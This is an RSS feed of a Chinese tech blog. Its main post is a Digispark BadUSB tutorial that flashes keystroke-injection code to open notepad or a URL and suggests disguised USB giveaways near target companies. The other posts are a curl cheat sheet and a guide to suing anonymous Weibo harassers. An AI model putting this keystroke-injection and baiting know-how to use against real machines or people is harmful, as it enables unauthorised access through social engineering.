<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>WhereIsMyMind</title><link>https://hare001.github.io/</link><atom:link href="https://hare001.github.io/index.xml" rel="self" type="application/rss+xml"/><description>WhereIsMyMind</description><generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en</language><lastBuildDate>Sun, 26 Jul 2020 22:30:29 +0800</lastBuildDate><item><title>Digispark BadUSB</title><link>https://hare001.github.io/posts/digispark-badusb/</link><pubDate>Sun, 26 Jul 2020 22:30:29 +0800</pubDate><guid>https://hare001.github.io/posts/digispark-badusb/</guid><description>&lt;p>最近闲着无聊，本着生命在于折腾的本质，用 Digispark 做个 BadUSB 玩玩。&lt;/p>
&lt;p>Digispark 长这样：&lt;/p>
&lt;p>&lt;img src="https://s3.amazonaws.com/digistump-resources/images/l/2520dcf84a0a3bf2257c2559d7a187db.jpg" alt="Digispark" style="zoom:50%;" />&lt;/p>
&lt;p>简单介绍下 Digispark 这个小玩意儿：&lt;/p>
&lt;p>Digispark USB Development Board 是一块基于 ATTiny85 微控制器的开发板，便宜小巧携带方便，某宝上十块包邮，相比于 BadUSB 的老前辈 USB Rubber Ducky 简直是便宜到家了好吗，性价比真的超高。&lt;span class="spoiler" >&lt;del>绝不承认不买 Rubber Ducky 是没钱，哼！&lt;/del>&lt;/span>&lt;/p>
&lt;p>关于 BadUSB，网上很多人都觉得只是含有有害程序的 U 盘，并以为可以通过格式化、禁止 U 盘自启动来阻止 BadUSB 的攻击。但其实它更像是没有按键的键盘，靠着烧录进去的程序来模拟人类输入，计算机是无法识别出 BadUSB 和人类正常输入的区别的。所以大家记得一定不要随便在自己或公司的电脑上插来历不明的 U 盘！&lt;/p>
&lt;h3 id="配置-digispark-开发环境">配置 Digispark 开发环境&lt;/h3>
&lt;p>要使用 Digispark 制作 BadUSB，首先我们要安装开发环境，在这里选择 Arduino。我的开发环境是 macOS，所以后续介绍以 macOS 为准。&lt;/p>
&lt;p>可以在 &lt;a href="https://www.arduino.cc/">Arduino&lt;/a> 官网上选择适配自己开发环境的安装版本。&lt;/p>
&lt;p>安装好 Arduino 后，在 Preferences -&amp;gt; Additional Boards Manager URLs 处输入：&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#960050;background-color:#1e0010">http://digistump.com/package_digistump_index.json
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>接下来在 Tools -&amp;gt; Board -&amp;gt; Boards Manager，安装 Digistump AVR Boards 包。
等待安装好，选择 Tools -&amp;gt; Board -&amp;gt; Digistump AVR Boards -&amp;gt; Digispark(Default - 16.5 Mhz)，此时 Arduino IDE 就可以成功识别 Digispark 开发板了。&lt;span class="spoiler" >&lt;del>居然没有出现驱动方面的问题，撒花&lt;/del>&lt;/span>&lt;/p>
&lt;h3 id="编写一份-helloworld-吧">编写一份 helloworld 吧！&lt;/h3>
&lt;p>既然是第一次玩 Digispark 开发板，怎么能不写一份 hello world 呢：&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;DigiKeyboard.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setup&lt;/span>() {
&lt;span style="color:#75715e">// put your setup code here, to run once:
&lt;/span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.sendKeyStroke(&lt;span style="color:#ae81ff">0&lt;/span>);
DigiKeyboard.delay(&lt;span style="color:#ae81ff">2000&lt;/span>);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); &lt;span style="color:#75715e">//GUI 键在 macOS 下是 ⌘ 键，在 Windows 下是徽标键
&lt;/span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.delay(&lt;span style="color:#ae81ff">300&lt;/span>);
DigiKeyboard.println(&lt;span style="color:#e6db74">&amp;#34;notepad&amp;#34;&lt;/span>);
DigiKeyboard.delay(&lt;span style="color:#ae81ff">300&lt;/span>);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
DigiKeyboard.delay(&lt;span style="color:#ae81ff">300&lt;/span>);
DigiKeyboard.println(&lt;span style="color:#e6db74">&amp;#34;hello, world!&amp;#34;&lt;/span>);
DigiKeyboard.delay(&lt;span style="color:#ae81ff">300&lt;/span>);
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">loop&lt;/span>() {
&lt;span style="color:#75715e">// put your main code here, to run repeatedly:
&lt;/span>&lt;span style="color:#75715e">&lt;/span>}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>点击 Verify 验证一下代码以防出错，然后就……报错了……&lt;/p>
&lt;p>此处 Error 信息：&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plaintext" data-lang="plaintext">fork/exec ~/Library/Arduino15/packages/arduino/tools/avr-gcc/4.8.1-arduino5/bin/avr-g++: bad CPU type in executable
Error compiling for board Digispark (Default - 16.5mhz).
&lt;/code>&lt;/pre>&lt;/div>&lt;p>STFW 找到了原因：从 macOS Catalina 开始，不再支持 32 位程序，所以需要替换掉 Digispark 自带的 32 位 AVR 编译工具。&lt;/p>
&lt;p>在 terminal 里运行：&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">cd ~/Library/Arduino15/packages/arduino/tools/avr-gcc
mv 4.8.1-arduino5 orig.4.8.1
ln -s /Applications/Arduino.app/Contents/Java/hardware/tools/avr 4.8.1-arduino5
&lt;/code>&lt;/pre>&lt;/div>&lt;p>再次验证，提示已经成功编译。&lt;/p>
&lt;h3 id="烧录代码">烧录代码&lt;/h3>
&lt;p>现在就可以上传代码到硬件上了，点击 Upload，在 60 秒内插入 Digispark 开发板完成上传。&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">Running Digispark Uploader...
Plug in device now... &lt;span style="color:#f92672">(&lt;/span>will timeout in &lt;span style="color:#ae81ff">60&lt;/span> seconds&lt;span style="color:#f92672">)&lt;/span>
&amp;gt; Please plug in the device ...
&amp;gt; Press CTRL+C to terminate the program.
&amp;gt; Device is found!
connecting: 16% complete
connecting: 22% complete
connecting: 28% complete
connecting: 33% complete
&amp;gt; Device has firmware version 2.2
&amp;gt; Device signature: 0x1e930b
&amp;gt; Available space &lt;span style="color:#66d9ef">for&lt;/span> user applications: &lt;span style="color:#ae81ff">6522&lt;/span> bytes
&amp;gt; Suggested sleep time between sending pages: 7ms
&amp;gt; Whole page count: &lt;span style="color:#ae81ff">102&lt;/span> page size: &lt;span style="color:#ae81ff">64&lt;/span>
&amp;gt; Erase &lt;span style="color:#66d9ef">function&lt;/span> sleep duration: 714ms
parsing: 50% complete
&amp;gt; Erasing the memory ...
erasing: 55% complete
erasing: 60% complete
erasing: 65% complete
&amp;gt; Starting to upload ...
writing: 70% complete
writing: 75% complete
writing: 80% complete
&amp;gt; Starting the user app ...
running: 100% complete
&amp;gt;&amp;gt; Micronucleus &lt;span style="color:#66d9ef">done&lt;/span>. Thank you!
&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们将板子插入&lt;span class="spoiler" >&lt;del>受害者&lt;/del>&lt;/span>朋友的 Windows 设备上，就可以看到运行 notepad 并输出 hello world 了。&lt;/p>
&lt;h3 id="更进一步">更进一步&lt;/h3>
&lt;p>现在我们可以尝试自己写一个 payload 了。&lt;/p>
&lt;p>其实利用 BadUSB 的攻击过程，就是将 Digispark 开发板伪装成为一个 HID（Human Interface Device）。&lt;/p>
&lt;pre>&lt;code class="language-wiki" data-lang="wiki">HID（Human Interface Device）人机接口设备类别是 Windows 最早支持的USB类别。由其名称可以了解 HID 设备是计算机直接
与人交互的设备，例如键盘、鼠标和游戏杆等。不过 HID 设备不一定要有人机接口，只要符合 HID 类别规范，就都是 HID 设备。
&lt;/code>&lt;/pre>&lt;p>我们可以通过添加、修改注册表项，下载执行脚本，执行命令，结束进程等达到一系列我们想要实现的结果。
现在网上给 BadUSB 准备的脚本多为给 Rubber Ducky 准备的，还好我们可以进行转换，其实原理都是一样的，只不过实现代码不同。
Rubber Ducky 的代码长这样：&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bat" data-lang="bat">DELAY 600
&lt;span style="color:#75715e">REM Linux run dialog&lt;/span>
ALT F2
DELAY 200
&lt;span style="color:#75715e">REM Mac OS run dialog&lt;/span>
GUI SPACE
DELAY 200
&lt;span style="color:#75715e">REM On Windows this changes the input language, so press 3 times&lt;/span>
GUI SPACE
DELAY 200
GUI SPACE
DELAY 200
GUI r
DELAY 200
&lt;span style="color:#75715e">REM On another OS, this could have typed &amp;#34; r&amp;#34;. Backspace 4 times.&lt;/span>
DELETE
REPEAT 4
&lt;span style="color:#75715e">REM Type in URL and open page!&lt;/span>
STRING http://example.com/
ENTER
&lt;/code>&lt;/pre>&lt;/div>&lt;p>以上脚本是模拟键盘在各种操作系统上的打开指定网页的操作。&lt;/p>
&lt;p>可以使用 &lt;a href="https://nixu-corp.github.io/">dckunio.js&lt;/a> 来在线转换，也可以使用 &lt;a href="https://github.com/mame82/duck2spark">duck2spark&lt;/a> 脚本来进行转换。&lt;/p>
&lt;p>上面的脚本转换好了长这样：&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">/*
&lt;/span>&lt;span style="color:#75715e"> * Generated with &amp;lt;3 by Dckuino.js, an open source project !
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;avr/pgmspace.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;DigiKeyboard.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> line1[] PROGMEM &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://example.com/&amp;#34;&lt;/span>;
&lt;span style="color:#66d9ef">char&lt;/span> buffer[&lt;span style="color:#ae81ff">256&lt;/span>];
&lt;span style="color:#75715e">#define GetPsz(x) (strncpy_P(buffer, (char*)x, 256))
&lt;/span>&lt;span style="color:#75715e">#define KEY_UP_ARROW 0x52
&lt;/span>&lt;span style="color:#75715e">#define KEY_DOWN_ARROW 0x51
&lt;/span>&lt;span style="color:#75715e">#define KEY_LEFT_ARROW 0x50
&lt;/span>&lt;span style="color:#75715e">#define KEY_RIGHT_ARROW 0x4F
&lt;/span>&lt;span style="color:#75715e">#define KEY_LEFT_GUI 0xE3
&lt;/span>&lt;span style="color:#75715e">#define KEY_ESC 0x29
&lt;/span>&lt;span style="color:#75715e">#define KEY_TAB 0x2B
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">digiBegin&lt;/span>() {
DigiKeyboard.sendKeyStroke(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">0&lt;/span>);
DigiKeyboard.delay(&lt;span style="color:#ae81ff">50&lt;/span>);
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">digiEnd&lt;/span>() {
&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> led&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
pinMode(led, OUTPUT);
&lt;span style="color:#66d9ef">while&lt;/span> (&lt;span style="color:#ae81ff">1&lt;/span>) {
digitalWrite(led, &lt;span style="color:#f92672">!&lt;/span>digitalRead(led));
DigiKeyboard.delay(&lt;span style="color:#ae81ff">1000&lt;/span>);
}
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">printText&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>txt) {
DigiKeyboard.print(txt);
DigiKeyboard.update();
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setup&lt;/span>() {
digiBegin();
DigiKeyboard.delay(&lt;span style="color:#ae81ff">600&lt;/span>);
&lt;span style="color:#75715e">// Linux run dialog
&lt;/span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.sendKeyStroke(KEY_F2,MOD_ALT_LEFT);
DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
&lt;span style="color:#75715e">// Mac OS run dialog
&lt;/span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_GUI_LEFT);
DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
&lt;span style="color:#75715e">// On Windows this changes the input language, so press 3 times
&lt;/span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_GUI_LEFT);
DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
DigiKeyboard.sendKeyStroke(KEY_SPACE,MOD_GUI_LEFT);
DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
DigiKeyboard.delay(&lt;span style="color:#ae81ff">200&lt;/span>);
&lt;span style="color:#75715e">// On another OS, this could have typed &amp;#34; r&amp;#34;. Backspace 4 times.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>; i&lt;span style="color:#f92672">++&lt;/span>) {
DigiKeyboard.sendKeyStroke(KEY_DELETE);
}
&lt;span style="color:#75715e">// Type in URL and open page!
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// http://example.com/
&lt;/span>&lt;span style="color:#75715e">&lt;/span> printText(GetPsz(line1));
DigiKeyboard.sendKeyStroke(KEY_ENTER);
digiEnd();
}
&lt;span style="color:#75715e">/* Unused endless loop */&lt;/span>
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">loop&lt;/span>() {}
&lt;/code>&lt;/pre>&lt;/div>&lt;p>首次烧录完，插入受攻击的设备没能正常实现功能，可能是驱动问题（部分情况耐心等待即可）、中文输入法问题（可以通过大写锁定键进行绕过）、不同操作系统快捷功能键不同，找到出现问题的步骤进行调试即可。&lt;/p>
&lt;p>如果不会编写 Rubber Ducky 脚本或者 Digispark 脚本，可以根据自己的攻击思路在 &lt;a href="https://www.ducktoolkit.com/">DuckToolkit&lt;/a> 生成 Rubber Ducky 的 Payload，然后进行转换即可。&lt;/p>
&lt;p>另外，Digispark 开发版元件都是直接暴露出来的，这样容易造成短路等物理损坏。可以用热缩管将开发板隔离一下，或者是 3D 打印个 U 盘的外壳来进行伪装。用这个来做 BadUSB 搞社工成本还是很低的，只要在目标公司附近摆个「扫码领 U 盘」的活动就可以了，毕竟人才是最脆弱的安全系统。&lt;/p>
&lt;p>参考：&lt;/p>
&lt;p>&lt;a href="https://www.ducktoolkit.com/">Duck Toolkit&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/hak5darren/USB-Rubber-Ducky">USB-Rubber-Ducky&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads">USB-Rubber-Ducky-Payloads&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/mame82/duck2spark">duck2spark&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://nixu-corp.github.io/">dckunio.js&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/CedArctic/DigiSpark-Scripts">DigiSpark-Scripts&lt;/a>&lt;/p>
&lt;!--&lt;span class="spoiler" > 隐藏文字 &lt;/span>-->
&lt;!--
&lt;div>&lt;iframe id="biliplayer" src="//player.bilibili.com/player.html?aid=AV%e5%8f%b7&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" loading="lazy" > &lt;/iframe>&lt;/div>
嵌入 BiliBili 视频 --></description></item><item><title>Curl Cheat Sheet</title><link>https://hare001.github.io/posts/curl-cheat-sheet/</link><pubDate>Fri, 17 Jul 2020 16:30:13 +0800</pubDate><guid>https://hare001.github.io/posts/curl-cheat-sheet/</guid><description>&lt;h3 id="options">Options&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -o &amp;lt;file&amp;gt; &lt;span style="color:#75715e"># --output: write to file&lt;/span>
curl -u user:pass &lt;span style="color:#75715e"># --user: Authentication&lt;/span>
curl -v &lt;span style="color:#75715e"># --verbose&lt;/span>
curl -vv &lt;span style="color:#75715e"># Even more verbose&lt;/span>
curl -s &lt;span style="color:#75715e"># --silent&lt;/span>
curl -i &lt;span style="color:#75715e"># --include: Include the HTTP-header in the output&lt;/span>
curl -I &lt;span style="color:#75715e"># --head: headers only&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="request">Request&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -X POST &lt;span style="color:#75715e"># --request&lt;/span>
curl -L &lt;span style="color:#75715e"># follow link if page redirects&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="data">Data&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -d &lt;span style="color:#e6db74">&amp;#39;data&amp;#39;&lt;/span> &lt;span style="color:#75715e"># --data: HTTP post data, URL encoded (eg, status=&amp;#34;Hello&amp;#34;)&lt;/span>
curl -d @file &lt;span style="color:#75715e"># --data via file&lt;/span>
curl -G &lt;span style="color:#75715e"># --get: send -d data via get&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="headers">Headers&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -A &amp;lt;str&amp;gt; &lt;span style="color:#75715e"># --user-agent&lt;/span>
curl -b name&lt;span style="color:#f92672">=&lt;/span>val &lt;span style="color:#75715e"># --cookie&lt;/span>
curl -b FILE &lt;span style="color:#75715e"># --cookie&lt;/span>
curl -H &lt;span style="color:#e6db74">&amp;#34;X-Foo: y&amp;#34;&lt;/span> &lt;span style="color:#75715e"># --header&lt;/span>
curl --compressed &lt;span style="color:#75715e"># use deflate/gzip&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="ssl">SSL&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl --cacert &amp;lt;file&amp;gt; --capath &amp;lt;dir&amp;gt;
curl -E, --cert &amp;lt;cert&amp;gt; &lt;span style="color:#75715e"># --cert: Client cert file --cert-type # der/pem/eng&lt;/span>
curl -k, --insecure &lt;span style="color:#75715e"># for self-signed certs&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="examples">Examples&lt;/h3>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">&lt;span style="color:#75715e"># Post data:&lt;/span>
curl -d password&lt;span style="color:#f92672">=&lt;/span>x http://x.com/y
&lt;span style="color:#75715e"># Auth/data:&lt;/span>
curl -u user:pass -d status&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Hello&amp;#34;&lt;/span> http://twitter.com/statuses/update.xml
&lt;span style="color:#75715e"># multipart file upload&lt;/span>
curl -v -include --form key1&lt;span style="color:#f92672">=&lt;/span>value1 --form upload&lt;span style="color:#f92672">=&lt;/span>@localfilename URL
&lt;span style="color:#75715e"># Use Curl to Check if a remote resource is available&lt;/span>
&lt;span style="color:#75715e"># details: https://matthewsetter.com/check-if-file-is-available-with-curl/&lt;/span>
curl -o /dev/null --silent -Iw &lt;span style="color:#e6db74">&amp;#34;%{http_code}&amp;#34;&lt;/span> https://example.com/my.remote.tarball.gz
&lt;/code>&lt;/pre>&lt;/div>&lt;!--&lt;span class="spoiler" > 隐藏文字 &lt;/span>-->
&lt;!--
&lt;div>&lt;iframe id="biliplayer" src="//player.bilibili.com/player.html?aid=AV%e5%8f%b7&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" loading="lazy" > &lt;/iframe>&lt;/div>
嵌入 BiliBili 视频 --></description></item><item><title>怎样诉讼躲在屏幕后面疯狂攻击你的人</title><link>https://hare001.github.io/posts/how-to-sue-somebody-for-harassing/</link><pubDate>Tue, 14 Jul 2020 13:17:12 +0800</pubDate><guid>https://hare001.github.io/posts/how-to-sue-somebody-for-harassing/</guid><description>&lt;h2 id="怎样告躲在屏幕后面疯狂攻击你的人其实很简单完全指南来了">怎样告躲在屏幕后面疯狂攻击你的人？其实很简单，完全指南来了。&lt;/h2>
&lt;h3 id="如果你觉得微博上有人肆无忌惮地伤害您您又不知道ta是谁不知怎么告ta一步一步这样做">如果你觉得微博上有人肆无忌惮地伤害您，您又不知道TA是谁、不知怎么告TA，一步一步这样做：&lt;/h3>
&lt;p>1，找你居住地的公证处，要求公证这些令你觉得受到伤害的帖子。通常大约1000元左右。注意，您要亲自去一下公证处。可以电话预约。保留好发票！有人最后会报销的。&lt;/p>
&lt;p>居住地的含义是你现在居住的地方而不是户籍地，只需要有暂住证或居住证。&lt;/p>
&lt;p>2，在你居住地的法院，提交诉讼。诉讼费约50元。如果觉得写诉状头疼，可以延请你信任的任何人，甚至不一定是执业律师。诉讼制度改革后，法院目前对此类诉状基本去了就受理。&lt;/p>
&lt;p>律师费高低不等，不过不会白花钱的，把发票放好，最后也会有人报销。所以强烈建议找个律师并给予全面授权，他或者她会为您办很多事情，包括并不限于全权代理您出庭，您自己都可以不去。&lt;/p>
&lt;p>我实践的时候，根本不想看见那些人，所以我一次都没出庭。说结果：赢了。）&lt;/p>
&lt;p>3，重点来了。你要告的第一个人（法人）是新浪微博（微梦创科公司）。你要求他提供侵权人的信息。依据两高的司法解释（具有法律效力，附后），你的诉求会被法院支持。这时候，已经非常娴熟的微博律师会提出和解。你答应就好：给出涉嫌侵权人的信息，我就撤销对你的诉讼。这是庭前和解，具有法律强制效力。&lt;/p>
&lt;p>4，她（我遇见的真是新浪微博的美女律师）很快会给出你希望找到的那个人的一大堆信息，包括他最近几年每一个帖子的IP地址，发微博的手机号，如果他带V，还有所有认证信息，包括身份证号码。&lt;/p>
&lt;p>5，你如约撤销对微博的诉讼，追加那个你终于得到个人信息的、你真正想告的人，开始进入正常的诉讼环节。&lt;/p>
&lt;p>6，胜诉，申请强制执行。&lt;/p>
&lt;h3 id="细节处理如果您请了律师他或者她也会知道这些">细节处理。如果您请了律师，他或者她也会知道这些：&lt;/h3>
&lt;p>1，拿到了微博提供的信息，比如一些IP地址、电话号码等等，你还是无法查出他的身份信息，导致法院无法进入正常的诉讼程序，怎么办？&lt;/p>
&lt;p>律师可以填写附图的表，请法庭协助调查。很快，你就能知道他或者她叫什么、身份证号码、身份证上的地址（很重要）了。&lt;/p>
&lt;p>2，不知道他当前的地址，怎么送达传票？&lt;/p>
&lt;p>要求法院按照身份证上的地址邮递。如果因为未被签收、拒收等等原因退回，就更好了。你这时可以要求进行“公告送达”，手续费大约几十元到200元不等。发票也存好。公告会出现在某个法院指定的报纸上：XXX，某人已向你提起诉讼，请于什么时间之前与谁联系&amp;hellip;&lt;/p>
&lt;p>TA还不理？最好了。公告刊登60天后视同送达，法庭将在公告后择日开庭。TA不出现？最好了，法庭将缺席审理，并视同对方放弃质证和答辩权。这时候你只要回答审判员或合议庭的问题就好了。&lt;/p>
&lt;p>3，对方拒不执行怎么办？&lt;/p>
&lt;p>你的诉讼请求要包括要求对方公开赔礼道歉（很重要）、删除帖子、负担诉讼费、律师费、公证费、公告费及精神赔偿。&lt;/p>
&lt;p>判决生效后，你可以去执行庭请求强制执行。删除帖子好办，法庭出个文，微博会照办的。赔偿也好办，你有他的名字和身份证号码，执行庭会查出他的银行卡并强制扣除，不够扣的，他就是老赖，上黑名单。&lt;/p>
&lt;p>赔礼道歉的部分，你一定要求：在微博置顶道歉N天（多少天你和律师商量，一般是7-15天）或（很重要！）在微博首页或你所在城市的报纸刊登判决书摘要N天。&lt;/p>
&lt;p>这样，如果他拒绝在他的微博道歉，你可以申请强制执行刊登判决书摘要。其成本由被告承担，通常需要几十万到上百万元。如果不给钱，当然也是强制执行，他卡上钱如果不够，可以列入老赖，直到给付为止。&lt;/p>
&lt;p>在此期间你可以公开征求对方财产线索，如房产、汽车、股票等，如果获得，可报告执行庭实施查封、拍卖。&lt;/p>
&lt;p>4，如果对方是体制内的人士或者党员团员，不要忘记将此诉讼和执行情况，整理成文件，发给TA的主管纪检监察部门。依据新党规100条，有他或者她好看的。&lt;/p>
&lt;p>附带说一下，还有被我诉讼、判决生效后的人迄今没有履行。别忘记，我在一定的时效内可以随时申请强制执行。去执行庭填个申请表，10分钟的事儿。我什么时候想起来去填报，看我高兴。&lt;/p>
&lt;p>5，对方只是转发我可以告TA吗？&lt;/p>
&lt;p>可以，而转发的阅读量越大，责任越大。详见附录的第十条。&lt;/p>
&lt;h3 id="附录">附录。&lt;/h3>
&lt;p>最高人民法院关于审理利用信息网络侵害人身权益民事纠纷案件适用法律若干问题的规定摘要（最高人民法院审判委员会第1621次会议通过）。众所周知，最高法院的法律解释具有法律效力。&lt;/p>
&lt;p>第一条 本规定所称的利用信息网络侵害人身权益民事纠纷案件，是指利用信息网络侵害他人姓名权、名称权、名誉权、荣誉权、肖像权、隐私权等人身权益引起的纠纷案件。&lt;/p>
&lt;p>第二条 利用信息网络侵害人身权益提起的诉讼，由侵权行为地或者被告住所地人民法院管辖。侵权行为实施地包括实施被诉侵权行为的计算机等终端设备所在地，侵权结果发生地包括被侵权人住所地。&lt;/p>
&lt;p>第三条 原告依据侵权责任法第三十六条第二款、第三款的规定起诉网络用户或者网络服务提供者的，人民法院应予受理。&lt;/p>
&lt;p>原告仅起诉网络用户，网络用户请求追加涉嫌侵权的网络服务提供者为共同被告或者第三人的，人民法院应予准许。&lt;/p>
&lt;p>原告仅起诉网络服务提供者，网络服务提供者请求追加可以确定的网络用户为共同被告或者第三人的，人民法院应予准许。&lt;/p>
&lt;p>第四条 原告起诉网络服务提供者，网络服务提供者以涉嫌侵权的信息系网络用户发布为由抗辩的，人民法院可以根据原告的请求及案件的具体情况，责令网络服务提供者向人民法院提供能够确定涉嫌侵权的网络用户的姓名（名称）、联系方式、网络地址等信息。&lt;/p>
&lt;p>网络服务提供者无正当理由拒不提供的，人民法院可以依据民事诉讼法第一百一十四条的规定对网络服务提供者采取处罚等措施。&lt;/p>
&lt;p>原告根据网络服务提供者提供的信息请求追加网络用户为被告的，人民法院应予准许。&lt;/p>
&lt;p>第十条 人民法院认定网络用户或者网络服务提供者转载网络信息行为的过错及其程度，应当综合以下因素： （一）转载主体所承担的与其性质、影响范围相适应的注意义务；（二）所转载信息侵害他人人身权益的明显程度。&lt;/p>
&lt;p>第十五条 雇佣、组织、教唆或者帮助他人发布、转发网络信息侵害他人人身权益，被侵权人请求行为人承担连带责任的，人民法院应予支持。&lt;/p>
&lt;p>第十六条 人民法院判决侵权人承担赔礼道歉、消除影响或者恢复名誉等责任形式的，应当与侵权的具体方式和所造成的影响范围相当。侵权人拒不履行的，人民法院可以采取在网络上发布公告或者公布裁判文书等合理的方式执行，由此产生的费用由侵权人承担。&lt;/p>
&lt;p>第十八条 被侵权人为制止侵权行为所支付的合理开支，可以认定为侵权责任法第二十条规定的财产损失。合理开支包括被侵权人或者委托代理人对侵权行为进行调查、取证的合理费用。人民法院根据当事人的请求和具体案情，可以将符合国家有关部门规定的律师费用计算在赔偿范围内。&lt;/p>
&lt;p>被侵权人因人身权益受侵害造成的财产损失或者侵权人因此获得的利益无法确定的，人民法院可以根据具体案情在50万元以下的范围内确定赔偿数额。&lt;/p>
